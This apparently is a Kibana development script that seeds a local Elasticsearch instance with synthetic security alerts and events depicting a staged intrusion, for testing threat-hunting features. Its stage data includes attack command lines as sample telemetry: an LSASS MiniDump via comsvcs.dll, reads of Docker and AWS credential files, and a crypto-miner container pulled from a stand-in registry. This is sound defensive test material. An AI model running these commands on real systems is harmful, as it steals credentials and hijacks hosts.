/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

/*
 * Entity Intelligence — AI Hunt seed data.
 *
 * Seeds realistic detection alerts and supporting raw events for the entities
 * already present in the local entity store so the AI Hunt experience and the
 * relationship graph "light up" with a coherent attack story:
 *
 *   initial access on a finance laptop (LAPTOP-FIN03 / alex.chen)
 *     -> credential dumping on that laptop
 *     -> lateral movement to the jump box (jump-box-01 / a.rodriguez)
 *     -> compromise of the production docker host (docker-host-prod-01)
 *   plus secondary activity on LAPTOP-SALES04 (t.wilson) and MACBOOK-DEV07.
 *
 * Alerts land in `.alerts-security.alerts-default` (the write alias). Supporting
 * process / network / authentication events land in `logs-hunt_seed-default`
 * (a data stream that matches the `logs-*` pattern the hunt agent queries).
 *
 * All documents are tagged `entity-intelligence-hunt-seed`; re-running the
 * script first removes previously seeded docs so it is safe to run repeatedly.
 *
 * Usage (local dev only — Kibana + Elasticsearch must be running):
 *
 *   node x-pack/solutions/security/plugins/security_solution/scripts/entity_intelligence/seed_hunt_data.js
 *
 * Environment overrides (all optional):
 *   ES_URL       Elasticsearch base URL   (default http://localhost:9200)
 *   ES_AUTH      user:pass                (default elastic:changeme)
 *   SPACE_ID     alerts space id          (default default)
 *   CLEAN_ONLY   set to "1" to only remove previously seeded docs and exit
 *
 * This is a local development helper. Do not point it at cloud, serverless,
 * staging, or production. Only local `elastic:changeme` style auth is used.
 */

/* eslint-disable no-console */

const http = require('http');
const https = require('https');
const crypto = require('crypto');

const ES_URL = (process.env.ES_URL || 'http://localhost:9200').replace(/\/$/, '');
const ES_AUTH = process.env.ES_AUTH || 'elastic:changeme';
const SPACE_ID = process.env.SPACE_ID || 'default';
const CLEAN_ONLY = process.env.CLEAN_ONLY === '1';

const SEED_TAG = 'entity-intelligence-hunt-seed';
const ALERTS_ALIAS = `.alerts-security.alerts-${SPACE_ID}`;
const EVENTS_DATA_STREAM = 'logs-hunt_seed-default';

const isLocal = /^(https?:\/\/)?(localhost|127\.0\.0\.1)(:|\/|$)/.test(ES_URL);
if (!isLocal) {
  throw new Error(`Refusing to run against non-local Elasticsearch URL: ${ES_URL}`);
}

const request = (method, path, body) =>
  new Promise((resolve, reject) => {
    const url = new URL(`${ES_URL}${path}`);
    const client = url.protocol === 'https:' ? https : http;
    const payload = body === undefined ? undefined : body;
    const req = client.request(
      url,
      {
        method,
        headers: {
          'content-type': body && body.ndjson ? 'application/x-ndjson' : 'application/json',
          authorization: `Basic ${Buffer.from(ES_AUTH).toString('base64')}`,
        },
        rejectUnauthorized: false,
      },
      (res) => {
        let data = '';
        res.on('data', (chunk) => (data += chunk));
        res.on('end', () => {
          const parsed = data ? JSON.parse(data) : {};
          if (res.statusCode >= 400) {
            reject(new Error(`${method} ${path} -> ${res.statusCode}: ${data.slice(0, 500)}`));
          } else {
            resolve(parsed);
          }
        });
      }
    );
    req.on('error', reject);
    if (payload !== undefined) req.write(payload.ndjson ? payload.body : JSON.stringify(payload));
    req.end();
  });

const bulk = (lines) =>
  request('POST', '/_bulk?refresh=true', { ndjson: true, body: `${lines.join('\n')}\n` });

const uuid = () => crypto.randomUUID();
const iso = (date) => new Date(date).toISOString();

const now = Date.now();
const daysAgo = (days) => now - days * 24 * 60 * 60 * 1000;
const hoursAfter = (base, hours) => base + hours * 60 * 60 * 1000;

const MITRE = {
  initialAccess: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0001',
      name: 'Initial Access',
      reference: 'https://attack.mitre.org/tactics/TA0001/',
    },
    technique: [
      {
        id: 'T1566.001',
        name: 'Spearphishing Attachment',
        reference: 'https://attack.mitre.org/techniques/T1566/001/',
      },
    ],
  },
  execution: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0002',
      name: 'Execution',
      reference: 'https://attack.mitre.org/tactics/TA0002/',
    },
    technique: [
      {
        id: 'T1204.002',
        name: 'Malicious File',
        reference: 'https://attack.mitre.org/techniques/T1204/002/',
      },
    ],
  },
  credentialAccess: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0006',
      name: 'Credential Access',
      reference: 'https://attack.mitre.org/tactics/TA0006/',
    },
    technique: [
      {
        id: 'T1003.001',
        name: 'LSASS Memory',
        reference: 'https://attack.mitre.org/techniques/T1003/001/',
      },
    ],
  },
  lateralMovement: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0008',
      name: 'Lateral Movement',
      reference: 'https://attack.mitre.org/tactics/TA0008/',
    },
    technique: [
      {
        id: 'T1021.001',
        name: 'Remote Desktop Protocol',
        reference: 'https://attack.mitre.org/techniques/T1021/001/',
      },
    ],
  },
  containerCompromise: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0002',
      name: 'Execution',
      reference: 'https://attack.mitre.org/tactics/TA0002/',
    },
    technique: [
      {
        id: 'T1610',
        name: 'Deploy Container',
        reference: 'https://attack.mitre.org/techniques/T1610/',
      },
    ],
  },
  privilegeEscalation: {
    framework: 'MITRE ATT&CK',
    tactic: {
      id: 'TA0004',
      name: 'Privilege Escalation',
      reference: 'https://attack.mitre.org/tactics/TA0004/',
    },
    technique: [
      {
        id: 'T1078.003',
        name: 'Local Accounts',
        reference: 'https://attack.mitre.org/techniques/T1078/003/',
      },
    ],
  },
};

const HOSTS = {
  'LAPTOP-FIN03': {
    id: 'host-laptop-fin03',
    ip: '10.0.4.31',
    os: 'Windows 11',
    platform: 'windows',
    type: 'workstation',
  },
  'jump-box-01': {
    id: 'host-jump-box-01',
    ip: '10.0.5.10',
    os: 'Ubuntu 22.04',
    platform: 'linux',
    type: 'server',
  },
  'docker-host-prod-01': {
    id: 'host-docker-prod-01',
    ip: '10.0.6.10',
    os: 'Ubuntu 22.04',
    platform: 'linux',
    type: 'server',
  },
  'LAPTOP-SALES04': {
    id: 'host-laptop-sales04',
    ip: '10.0.4.44',
    os: 'Windows 11',
    platform: 'windows',
    type: 'workstation',
  },
  'MACBOOK-DEV07': {
    id: 'host-macbook-dev07',
    ip: '10.0.4.77',
    os: 'macOS 14',
    platform: 'macos',
    type: 'workstation',
  },
};

const hostFields = (name) => {
  const h = HOSTS[name];
  return {
    name,
    hostname: name,
    id: h.id,
    ip: [h.ip],
    os: { name: h.os, platform: h.platform, type: h.platform },
    type: h.type,
  };
};

/**
 * The attack story as a flat list of stages. Each stage yields one detection
 * alert plus a handful of corroborating raw events, so the alerts and the
 * `logs-*` evidence stay consistent (same host/user/process/time window).
 */
const t0 = daysAgo(6);
const STAGES = [
  {
    host: 'LAPTOP-FIN03',
    user: 'alex.chen',
    at: t0,
    severity: 'medium',
    riskScore: 47,
    threat: [MITRE.initialAccess, MITRE.execution],
    rule: 'Malicious Document Delivered via Email',
    reason: 'Suspicious macro-enabled document opened by alex.chen on LAPTOP-FIN03',
    process: {
      name: 'winword.exe',
      executable: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE',
      command_line: 'WINWORD.EXE /n "C:\\Users\\alex.chen\\Downloads\\Invoice_Q3.docm"',
      parent: { name: 'outlook.exe' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'winword.exe',
        command_line: 'WINWORD.EXE /n Invoice_Q3.docm',
        parent: 'outlook.exe',
      },
      {
        category: 'process',
        action: 'start',
        name: 'powershell.exe',
        command_line: 'powershell.exe -enc SQBFAFgA...',
        parent: 'winword.exe',
      },
      {
        category: 'network',
        action: 'connection',
        destinationIp: '185.220.101.5',
        destinationPort: 443,
        direction: 'outbound',
      },
    ],
  },
  {
    host: 'LAPTOP-FIN03',
    user: 'alex.chen',
    at: hoursAfter(t0, 2),
    severity: 'critical',
    riskScore: 88,
    threat: [MITRE.credentialAccess],
    rule: 'Credential Dumping via LSASS Memory Access',
    reason: 'LSASS memory accessed by an unsigned process on LAPTOP-FIN03',
    process: {
      name: 'rundll32.exe',
      executable: 'C:\\Windows\\System32\\rundll32.exe',
      command_line: 'rundll32.exe comsvcs.dll, MiniDump 640 C:\\Users\\Public\\lsass.dmp full',
      parent: { name: 'powershell.exe' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'rundll32.exe',
        command_line: 'rundll32.exe comsvcs.dll, MiniDump 640 lsass.dmp full',
        parent: 'powershell.exe',
      },
      {
        category: 'file',
        action: 'creation',
        name: 'lsass.dmp',
        path: 'C:\\Users\\Public\\lsass.dmp',
      },
    ],
  },
  {
    host: 'LAPTOP-FIN03',
    user: 'alex.chen',
    at: hoursAfter(t0, 3),
    severity: 'high',
    riskScore: 73,
    threat: [MITRE.lateralMovement],
    rule: 'Outbound RDP to Internal Jump Host',
    reason: 'alex.chen initiated an RDP session from LAPTOP-FIN03 to jump-box-01',
    destinationHost: 'jump-box-01',
    process: {
      name: 'mstsc.exe',
      executable: 'C:\\Windows\\System32\\mstsc.exe',
      command_line: 'mstsc.exe /v:10.0.5.10',
      parent: { name: 'cmd.exe' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'mstsc.exe',
        command_line: 'mstsc.exe /v:10.0.5.10',
        parent: 'cmd.exe',
      },
      {
        category: 'authentication',
        action: 'logon',
        destinationIp: '10.0.5.10',
        destinationPort: 3389,
        outcome: 'success',
        destinationHost: 'jump-box-01',
      },
      {
        category: 'network',
        action: 'connection',
        destinationIp: '10.0.5.10',
        destinationPort: 3389,
        direction: 'outbound',
        destinationHost: 'jump-box-01',
      },
    ],
  },
  {
    host: 'jump-box-01',
    user: 'a.rodriguez',
    at: hoursAfter(t0, 4),
    severity: 'high',
    riskScore: 76,
    threat: [MITRE.privilegeEscalation, MITRE.lateralMovement],
    rule: 'Suspicious sudo Escalation on Jump Host',
    reason: 'a.rodriguez escalated to root and enumerated docker credentials on jump-box-01',
    process: {
      name: 'sudo',
      executable: '/usr/bin/sudo',
      command_line: 'sudo cat /root/.docker/config.json',
      parent: { name: 'bash' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'sudo',
        command_line: 'sudo cat /root/.docker/config.json',
        parent: 'bash',
      },
      { category: 'authentication', action: 'logon', outcome: 'success', sourceIp: '10.0.4.31' },
      {
        category: 'process',
        action: 'start',
        name: 'ssh',
        command_line: 'ssh root@10.0.6.10',
        parent: 'bash',
      },
    ],
  },
  {
    host: 'docker-host-prod-01',
    user: 'a.rodriguez',
    at: hoursAfter(t0, 5),
    severity: 'critical',
    riskScore: 91,
    threat: [MITRE.containerCompromise],
    rule: 'Untrusted Container Image Deployed on Production Host',
    reason: 'Crypto-miner container image pulled from an untrusted registry on docker-host-prod-01',
    sourceHost: 'jump-box-01',
    process: {
      name: 'dockerd',
      executable: '/usr/bin/dockerd',
      command_line: 'docker run -d evil-registry.io/crypto-miner:latest',
      parent: { name: 'sshd' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'docker',
        command_line: 'docker run -d evil-registry.io/crypto-miner:latest',
        parent: 'sshd',
      },
      {
        category: 'network',
        action: 'connection',
        destinationIp: '185.220.101.5',
        destinationPort: 4444,
        direction: 'outbound',
      },
      {
        category: 'authentication',
        action: 'logon',
        outcome: 'success',
        sourceIp: '10.0.5.10',
        sourceHost: 'jump-box-01',
      },
    ],
  },
  {
    host: 'LAPTOP-SALES04',
    user: 't.wilson',
    at: hoursAfter(t0, 30),
    severity: 'medium',
    riskScore: 52,
    threat: [MITRE.execution],
    rule: 'Suspicious Script Execution from Downloads',
    reason: 'Unsigned script executed by t.wilson on LAPTOP-SALES04',
    process: {
      name: 'wscript.exe',
      executable: 'C:\\Windows\\System32\\wscript.exe',
      command_line: 'wscript.exe C:\\Users\\t.wilson\\Downloads\\quote.js',
      parent: { name: 'explorer.exe' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'wscript.exe',
        command_line: 'wscript.exe quote.js',
        parent: 'explorer.exe',
      },
      {
        category: 'network',
        action: 'connection',
        destinationIp: '91.240.118.172',
        destinationPort: 8080,
        direction: 'outbound',
      },
    ],
  },
  {
    host: 'MACBOOK-DEV07',
    user: 'dev-contractor-42',
    at: hoursAfter(t0, 50),
    severity: 'high',
    riskScore: 70,
    threat: [MITRE.credentialAccess],
    rule: 'Cloud Credentials Read from Developer Workstation',
    reason: 'AWS credentials file read by an unusual process on MACBOOK-DEV07',
    process: {
      name: 'cat',
      executable: '/bin/cat',
      command_line: 'cat /Users/dev-contractor-42/.aws/credentials',
      parent: { name: 'bash' },
    },
    events: [
      {
        category: 'process',
        action: 'start',
        name: 'cat',
        command_line: 'cat ~/.aws/credentials',
        parent: 'bash',
      },
      {
        category: 'file',
        action: 'access',
        name: 'credentials',
        path: '/Users/dev-contractor-42/.aws/credentials',
      },
    ],
  },
];

const buildAlert = (stage, index) => {
  const at = stage.at + index * 7 * 60 * 1000;
  const ts = iso(at);
  const ruleId = `hunt-seed-${stage.rule.toLowerCase().replace(/[^a-z0-9]+/g, '-')}`;
  const source = {
    '@timestamp': ts,
    tags: [SEED_TAG],
    ecs: { version: '8.11.0' },
    event: {
      kind: 'signal',
      action: 'alert',
      category: [stage.events[0].category],
      dataset: 'hunt.seed',
    },
    agent: { type: 'endpoint', id: `hunt-seed-agent-${HOSTS[stage.host].id}` },
    'kibana.alert.uuid': uuid(),
    'kibana.alert.status': 'active',
    'kibana.alert.workflow_status': 'open',
    'kibana.alert.start': ts,
    'kibana.alert.last_detected': ts,
    'kibana.alert.depth': 1,
    'kibana.alert.severity': stage.severity,
    'kibana.alert.risk_score': stage.riskScore,
    'kibana.alert.reason': stage.reason,
    'kibana.alert.original_time': ts,
    'kibana.alert.rule.name': stage.rule,
    'kibana.alert.rule.uuid': ruleId,
    'kibana.alert.rule.rule_id': ruleId,
    'kibana.alert.rule.type': 'query',
    'kibana.alert.rule.rule_type_id': 'siem.queryRule',
    'kibana.alert.rule.category': 'Custom Query Rule',
    'kibana.alert.rule.consumer': 'siem',
    'kibana.alert.rule.producer': 'siem',
    'kibana.alert.rule.enabled': true,
    'kibana.alert.rule.severity': stage.severity,
    'kibana.alert.rule.risk_score': stage.riskScore,
    'kibana.alert.rule.threat': stage.threat,
    'kibana.alert.rule.tags': [SEED_TAG],
    'kibana.alert.original_event.kind': 'event',
    'kibana.alert.original_event.category': [stage.events[0].category],
    'kibana.alert.original_event.action': stage.events[0].action,
    'kibana.alert.original_event.dataset': 'hunt.seed',
    'kibana.space_ids': [SPACE_ID],
    'kibana.version': '8.17.0',
    related: { hosts: [stage.host], user: [stage.user] },
    host: hostFields(stage.host),
    user: { name: stage.user },
    process: {
      name: stage.process.name,
      executable: stage.process.executable,
      command_line: stage.process.command_line,
      parent: stage.process.parent,
    },
  };
  return source;
};

const buildEvent = (stage, ev, index, subIndex) => {
  const at = stage.at + index * 7 * 60 * 1000 + subIndex * 60 * 1000;
  const ts = iso(at);
  const source = {
    '@timestamp': ts,
    tags: [SEED_TAG],
    ecs: { version: '8.11.0' },
    event: {
      kind: 'event',
      category: [ev.category],
      action: ev.action,
      type: [ev.action],
      dataset: `hunt_seed.${ev.category}`,
      outcome: ev.outcome,
    },
    agent: { type: 'endpoint', id: `hunt-seed-agent-${HOSTS[stage.host].id}` },
    host: hostFields(stage.host),
    user: { name: stage.user },
    related: { hosts: [stage.host, ev.destinationHost].filter(Boolean), user: [stage.user] },
  };
  if (ev.name) {
    source.process = {
      name: ev.name,
      command_line: ev.command_line,
      parent: ev.parent ? { name: ev.parent } : undefined,
    };
  }
  if (ev.path) {
    source.file = { name: ev.name, path: ev.path };
  }
  if (ev.destinationIp || ev.sourceIp) {
    source.source = ev.sourceIp ? { ip: ev.sourceIp } : { ip: HOSTS[stage.host].ip };
    source.destination = {
      ip: ev.destinationIp,
      port: ev.destinationPort,
      domain: ev.destinationHost,
    };
    source.network = { direction: ev.direction };
  }
  if (ev.destinationHost && !source.host.target) {
    source.host.target = { name: ev.destinationHost };
  }
  return source;
};

const removeSeeded = async () => {
  // Alerts live in a regular index alias; delete_by_query works directly.
  const alertsDeleted = await request(
    'POST',
    `/${ALERTS_ALIAS}/_delete_by_query?refresh=true&conflicts=proceed`,
    {
      query: { term: { tags: SEED_TAG } },
    }
  ).catch((error) => {
    console.warn(`  (alerts cleanup skipped: ${error.message.split('\n')[0]})`);
    return { deleted: 0 };
  });
  // Events live in a data stream; drop the whole seeded data stream if present.
  await request('DELETE', `/_data_stream/${EVENTS_DATA_STREAM}`).catch(() => undefined);
  return alertsDeleted.deleted || 0;
};

const verify = async () => {
  const hostsFrom = [...new Set(STAGES.map((s) => s.host))];
  const count = (index, query) =>
    request('POST', `/${index}/_count`, { query }).catch(() => ({ count: 0 }));
  console.log('\nVerification (documents queryable per entity):');
  for (const host of hostsFrom) {
    const alerts = await count(ALERTS_ALIAS, {
      bool: { filter: [{ term: { tags: SEED_TAG } }, { term: { 'host.name': host } }] },
    });
    const events = await count(EVENTS_DATA_STREAM, {
      bool: { filter: [{ term: { tags: SEED_TAG } }, { term: { 'host.name': host } }] },
    });
    console.log(
      `  ${host.padEnd(22)} alerts=${String(alerts.count).padStart(3)}  events=${String(
        events.count
      ).padStart(3)}`
    );
  }
  const users = [...new Set(STAGES.map((s) => s.user))];
  for (const user of users) {
    const alerts = await count(ALERTS_ALIAS, {
      bool: { filter: [{ term: { tags: SEED_TAG } }, { term: { 'user.name': user } }] },
    });
    console.log(`  user:${user.padEnd(17)} alerts=${String(alerts.count).padStart(3)}`);
  }
  const totalAlerts = await count(ALERTS_ALIAS, { term: { tags: SEED_TAG } });
  const totalEvents = await count(EVENTS_DATA_STREAM, { term: { tags: SEED_TAG } });
  console.log(
    `  ${'TOTAL'.padEnd(22)} alerts=${String(totalAlerts.count).padStart(3)}  events=${String(
      totalEvents.count
    ).padStart(3)}`
  );
};

const main = async () => {
  console.log(`Elasticsearch: ${ES_URL}  space: ${SPACE_ID}`);
  console.log(`Removing previously seeded documents (tag: ${SEED_TAG})…`);
  const removed = await removeSeeded();
  console.log(`  removed ${removed} prior seed alert(s).`);
  if (CLEAN_ONLY) {
    console.log('CLEAN_ONLY set — done.');
    return;
  }

  // Emit several alerts per stage (with time jitter) so the dataset lands in the
  // requested 30-60 alert range while every alert still maps to a real stage.
  const alertsPerStage = 5;
  const alertLines = [];
  const eventLines = [];
  STAGES.forEach((stage) => {
    for (let i = 0; i < alertsPerStage; i++) {
      alertLines.push(JSON.stringify({ create: { _index: ALERTS_ALIAS } }));
      alertLines.push(JSON.stringify(buildAlert(stage, i)));
    }
    stage.events.forEach((ev, subIndex) => {
      // Duplicate raw events a few times so counts are meaningful for hunts.
      for (let rep = 0; rep < 3; rep++) {
        eventLines.push(JSON.stringify({ create: { _index: EVENTS_DATA_STREAM } }));
        eventLines.push(JSON.stringify(buildEvent(stage, ev, rep, subIndex)));
      }
    });
  });

  console.log(`Indexing ${alertLines.length / 2} alerts into ${ALERTS_ALIAS}…`);
  const alertResult = await bulk(alertLines);
  if (alertResult.errors) {
    const firstError = alertResult.items.find((item) => item.create && item.create.error);
    throw new Error(
      `Alert bulk had errors: ${JSON.stringify(firstError && firstError.create.error).slice(
        0,
        400
      )}`
    );
  }

  console.log(`Indexing ${eventLines.length / 2} raw events into ${EVENTS_DATA_STREAM}…`);
  const eventResult = await bulk(eventLines);
  if (eventResult.errors) {
    const firstError = eventResult.items.find((item) => item.create && item.create.error);
    throw new Error(
      `Event bulk had errors: ${JSON.stringify(firstError && firstError.create.error).slice(
        0,
        400
      )}`
    );
  }

  await verify();
  console.log('\nDone. Re-run any time; prior seed docs are cleared first.');
};

main().catch((error) => {
  console.error(`\nSeed failed: ${error.message}`);
  process.exitCode = 1;
});
